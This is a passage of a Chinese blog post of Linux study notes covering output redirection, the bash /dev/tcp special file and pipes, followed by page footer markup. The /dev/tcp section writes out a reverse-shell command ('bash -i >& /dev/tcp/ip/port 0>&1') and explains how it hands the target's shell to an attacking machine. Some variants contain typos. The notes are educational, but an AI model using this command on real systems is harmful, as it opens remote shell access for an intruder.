+<p>将<strong>标准输出或者错误输出</strong>写入到指定文件，如果该文件中已包含数据，新数据将写入到原有内容的后面。注意，第一种格式中，<strong>最后的 2&gt;&amp;1 是一体的，可以认为是固定写法。</strong></p>
+<p>linux重定向中<code>&amp;&gt;</code>和<code>&gt;&amp;</code>是一个意思，是“复制一个文件描述符”的意思。</p>
+<h5 id="特殊文件：-dev-tcp-dd"><a href="#特殊文件：-dev-tcp-dd" class="headerlink" title="特殊文件： &#x2F;dev&#x2F;tcp(dd)"></a>特殊文件： &#x2F;dev&#x2F;tcp(dd)</h5><p>&#x2F;dev&#x2F;tcp不是磁盘里的文件，而是bash的一个功能</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> 反弹shell命令：bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line"> url：https://blog.csdn.net/Auuuuuuuu/article/details/89059176</span><br><span class="line"> 就是说，攻击机的标准输入重定向到靶机的标准输出。</span><br><span class="line"> bash -i &lt; /dev/tcp/ip/port</span><br><span class="line"> 再把靶机的这个标准输出作为输入，命令执行后把结果作为标准输入重定向到攻击机中作为标准输出</span><br><span class="line">  bash i &gt; /dec/tcp/192.168.25.144/8888</span><br><span class="line">  两者结合得到</span><br><span class="line">  bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>linux中的一个特殊文件： &#x2F;dev&#x2F;tcp ,打开这个文件就类似于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。</p>
+<p>&#x2F;dev&#x2F;[tcpupd]&#x2F;host&#x2F;port 只要读取或者写入这个文件，相当于系统会尝试连接:host 这台机器，对应port端口。如果主机以及端口存在，就建立一个socket 连接。将在，&#x2F;proc&#x2F;self&#x2F;fd目录下面，有对应的文件出现。</p>
+<h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><h5 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h5><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221031020410633-1024x370.png" style="zoom:67%;" />
+
+<p><strong>注意这里连接符的 跟管道符 不一样</strong></p>
+<h5 id="管道符-详解"><a href="#管道符-详解" class="headerlink" title="管道符 详解"></a>管道符 详解</h5><p><strong>管道符也是一种重定向操作符。</strong></p>
+<h6 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h6><p>管道符主要用于多重命令处理，前面命令的打印结果作为后面命令的输入。简单点说就是，就像工厂的流水线一样，进行完一道工序后，继续传送给下一道工序处理…</p>
+<h6 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h6><p>使用管道操作符“”可以<strong>把一个命令的标准输出传送到另一个命令的标准输入中</strong>，连续的意味着第一个命令的输出为第二个命令的输入，第二个命令的输入为第一个命令的输出，依次类推。</p>
+<p>最常用的就是配合grep来使用：</p>
+<p>ps -ef grep pycharm</p>
+<p>ps是进程查看命令，其中-e为显示所有进程，-f为全格式显示。</p>
+<p>grep是一个非常高效的查询工具，可以查询文本中带有某关键字的行。</p>
+<p>这个命令的功能是，查询带有关键字 pycharm 的进程。会一条一条列出。</p>
+<p>但不是所有的命令都能搭配管道符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 例如cat、sort、uniq、grep等命令均支持管道符，是因为这些命令均可从标准输入中读取要处理的文本（即从标准输入中读取参数）；而对于部分命令，例如rm、kill等命令则不支持从标准输入中读取参数，只支持从命令行中读取参数（即rm命令后面必须指定删除的文件或者目录，kill命令后面必须要指定杀死的进程号等）</span><br><span class="line"> 那什么样的命令支持管道，什么样的命令不支持管道呢？</span><br><span class="line"> 一般情况下，处理文本的命令，例如sort、uniq、grep、awk、sed等命令均支持管道；像rm、ls这类的不是处理文本的命令均不支持管道</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Article</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">linux介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84"><span class="toc-number">2.</span> <span class="toc-text">文件系统的层次结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">目录解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%89%80%E6%9C%89%E7%9B%AE%E5%BD%95"><span class="toc-number">3.2.</span> <span class="toc-text">根目录下所有目录</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#bin"><span class="toc-number">3.2.0.1.</span> <span class="toc-text">&#x2F;bin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sbin"><span class="toc-number">3.2.0.2.</span> <span class="toc-text">&#x2F;sbin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#etc"><span class="toc-number">3.2.0.3.</span> <span class="toc-text">&#x2F;etc ***</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#home"><span class="toc-number">3.2.0.4.</span> <span class="toc-text">&#x2F;home</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#lib"><span class="toc-number">3.2.0.5.</span> <span class="toc-text">&#x2F;lib</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#lost-found"><span class="toc-number">3.2.0.6.</span> <span class="toc-text">&#x2F;lost+found</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#media"><span class="toc-number">3.2.0.7.</span> <span class="toc-text">&#x2F;media</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#mnt"><span class="toc-number">3.2.0.8.</span> <span class="toc-text">&#x2F;mnt</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#opt"><span class="toc-number">3.2.0.9.</span> <span class="toc-text">&#x2F;opt ***</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#proc"><span class="toc-number">3.2.0.10.</span> <span class="toc-text">&#x2F;proc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#root"><span class="toc-number">3.2.0.11.</span> <span class="toc-text">&#x2F;root</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#selinux"><span class="toc-number">3.2.0.12.</span> <span class="toc-text">&#x2F;selinux</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#srv"><span class="toc-number">3.2.0.13.</span> <span class="toc-text">&#x2F;srv</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sys"><span class="toc-number">3.2.0.14.</span> <span class="toc-text">&#x2F;sys</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#tmp"><span class="toc-number">3.2.0.15.</span> <span class="toc-text">&#x2F;tmp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#usr"><span class="toc-number">3.2.0.16.</span> <span class="toc-text">&#x2F;usr</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#usr-bin"><span class="toc-number">3.2.0.16.1.</span> <span class="toc-text">&#x2F;usr&#x2F;bin</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#usr-sbin"><span class="toc-number">3.2.0.16.2.</span> <span class="toc-text">&#x2F;usr&#x2F;sbin</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#usr-src"><span class="toc-number">3.2.0.16.3.</span> <span class="toc-text">&#x2F;usr&#x2F;src</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#var"><span class="toc-number">3.2.0.17.</span> <span class="toc-text">&#x2F;var ***</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E7%9B%AE%E5%BD%95"><span class="toc-number">3.3.</span> <span class="toc-text">重要目录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#proc-1"><span class="toc-number">3.3.1.</span> <span class="toc-text">&#x2F;proc</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">文件系统</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E7%9B%AE%E5%BD%95"><span class="toc-number">3.3.1.2.</span> <span class="toc-text">各种目录</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-cmdline"><span class="toc-number">3.3.1.2.1.</span> <span class="toc-text">&#x2F;proc&#x2F;cmdline</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-N-environ"><span class="toc-number">3.3.1.2.2.</span> <span class="toc-text">&#x2F;proc&#x2F;N&#x2F;environ</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-N-exe"><span class="toc-number">3.3.1.2.3.</span> <span class="toc-text">&#x2F;proc&#x2F;N&#x2F;exe</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-maps"><span class="toc-number">3.3.1.2.4.</span> <span class="toc-text">&#x2F;proc&#x2F;maps</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-N-fd"><span class="toc-number">3.3.1.2.5.</span> <span class="toc-text">&#x2F;proc&#x2F;N&#x2F;fd</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-cpuinfo"><span class="toc-number">3.3.1.2.6.</span> <span class="toc-text">&#x2F;proc&#x2F;cpuinfo</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-modules"><span class="toc-number">3.3.1.2.7.</span> <span class="toc-text">&#x2F;proc&#x2F;modules</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-fb"><span class="toc-number">3.3.1.2.8.</span> <span class="toc-text">&#x2F;proc&#x2F;fb</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-stat"><span class="toc-number">3.3.1.2.9.</span> <span class="toc-text">&#x2F;proc&#x2F;stat</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-N-cwd"><span class="toc-number">3.3.1.2.10.</span> <span class="toc-text">&#x2F;proc&#x2F;N&#x2F;cwd</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#etc-1"><span class="toc-number">3.3.2.</span> <span class="toc-text">&#x2F;etc</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#etc-passwd"><span class="toc-number">3.3.2.0.1.</span> <span class="toc-text">&#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#etc-shells"><span class="toc-number">3.3.2.0.2.</span> <span class="toc-text">&#x2F;etc&#x2F;shells</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#etc-group"><span class="toc-number">3.3.2.0.3.</span> <span class="toc-text">&#x2F;etc&#x2F;group</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#etc-fstab"><span class="toc-number">3.3.2.0.4.</span> <span class="toc-text">&#x2F;etc&#x2F;fstab</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#etc-rc-d"><span class="toc-number">3.3.2.0.5.</span> <span class="toc-text">&#x2F;etc&#x2F;rc.d</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#etc-init-d"><span class="toc-number">3.3.2.0.6.</span> <span class="toc-text">&#x2F;etc&#x2F;init.d</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#etc-shadow"><span class="toc-number">3.3.2.0.7.</span> <span class="toc-text">&#x2F;etc&#x2F;shadow</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#etc-hosts"><span class="toc-number">3.3.2.0.8.</span> <span class="toc-text">&#x2F;etc&#x2F;hosts</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6"><span class="toc-number">3.3.3.</span> <span class="toc-text">web服务器重要文件</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#apache"><span class="toc-number">3.3.3.0.1.</span> <span class="toc-text">apache</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#nginx%EF%BC%88dd%EF%BC%89"><span class="toc-number">3.3.3.0.2.</span> <span class="toc-text">nginx（dd）</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4"><span class="toc-number">4.</span> <span class="toc-text">命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4"><span class="toc-number">4.0.0.1.</span> <span class="toc-text">常见命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7"><span class="toc-number">4.0.0.2.</span> <span class="toc-text">查看当前用户</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bip%E7%AD%89%E4%BF%A1%E6%81%AF"><span class="toc-number">4.0.0.3.</span> <span class="toc-text">查看ip等信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E5%BD%93%E5%89%8D%E4%BD%8D%E7%BD%AE%E8%B7%AF%E5%BE%84"><span class="toc-number">4.0.0.4.</span> <span class="toc-text">显示当前位置路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#find"><span class="toc-number">4.0.0.5.</span> <span class="toc-text">find</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%EF%BC%88-%EF%BC%89"><span class="toc-number">4.0.0.6.</span> <span class="toc-text">系统信息（*）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E5%8E%8B%E7%BC%A9%E5%91%BD%E4%BB%A4"><span class="toc-number">4.0.0.7.</span> <span class="toc-text">解压缩命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-dd"><span class="toc-number">4.0.0.8.</span> <span class="toc-text">计划任务(dd)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#vim%E7%BC%96%E8%BE%91"><span class="toc-number">4.0.0.9.</span> <span class="toc-text">vim编辑</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">5.</span> <span class="toc-text">重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91-HTTP-%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-number">5.1.</span> <span class="toc-text">重定向 HTTP 状态码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E4%B8%AD%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">5.2.</span> <span class="toc-text">linux中重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">5.2.0.1.</span> <span class="toc-text">输入重定向</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">5.2.0.2.</span> <span class="toc-text">输出重定向</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%EF%BC%9A-dev-tcp-dd"><span class="toc-number">5.2.0.3.</span> <span class="toc-text">特殊文件： &#x2F;dev&#x2F;tcp(dd)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6"><span class="toc-number">5.3.</span> <span class="toc-text">管道符</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="toc-number">5.3.0.1.</span> <span class="toc-text">命令连接符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6-%E8%AF%A6%E8%A7%A3"><span class="toc-number">5.3.0.2.</span> <span class="toc-text">管道符 详解</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8"><span class="toc-number">5.3.0.2.1.</span> <span class="toc-text">作用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%94%A8%E6%B3%95"><span class="toc-number">5.3.0.2.2.</span> <span class="toc-text">用法</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2023/05/14/linux/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2023/05/14/linux/&text=linux"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2023/05/14/linux/&title=linux"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2023/05/14/linux/&is_video=false&description=linux"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=linux&body=Check out this article: http://p5ych2022.github.io/2023/05/14/linux/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2023/05/14/linux/&title=linux"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2023/05/14/linux/&title=linux"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2023/05/14/linux/&title=linux"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2023/05/14/linux/&title=linux"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2023/05/14/linux/&name=linux&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2023/05/14/linux/&t=linux"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    psych
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
